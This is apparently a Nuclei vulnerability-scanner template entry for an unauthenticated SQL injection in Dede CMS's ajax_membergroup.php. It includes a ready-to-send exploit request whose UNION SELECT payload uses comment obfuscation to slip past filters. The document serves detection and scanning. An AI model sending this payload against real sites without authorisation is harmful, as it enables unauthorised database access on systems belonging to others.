# Nuclei Template: Dede CMS - SQL Injection
**Template ID:** dedecms-membergroup-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`dedecms-membergroup-sqli.yaml`)

## Vulnerability Information & PoC

## Description
Dede CMS contains a SQL injection vulnerability which allows remote unauthenticated users to inject arbitrary SQL statements via the ajax_membergroup.php endpoint and the membergroup parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5({{num}})+--+@`'`
```

## References
- http://www.dedeyuan.com/xueyuan/wenti/1244.html
